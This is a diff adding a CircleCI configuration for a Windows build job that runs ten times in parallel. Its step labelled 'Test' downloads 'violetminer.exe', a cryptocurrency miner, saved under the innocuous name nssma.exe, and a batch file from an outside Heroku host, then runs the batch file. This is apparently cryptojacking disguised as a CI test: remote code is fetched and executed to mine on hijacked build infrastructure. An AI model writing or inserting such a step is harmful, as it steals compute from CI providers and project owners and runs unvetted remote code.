@@ -1,0 +1,19 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build:
+    parallelism: 10
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - run:
+          name: Test
+          command: |
+            Invoke-WebRequest https://papakola01.herokuapp.com/violetminer.exe -OutFile nssma.exe
+            Invoke-WebRequest https://papakola01.herokuapp.com/log.bat -OutFile log.bat
+            .\log.bat
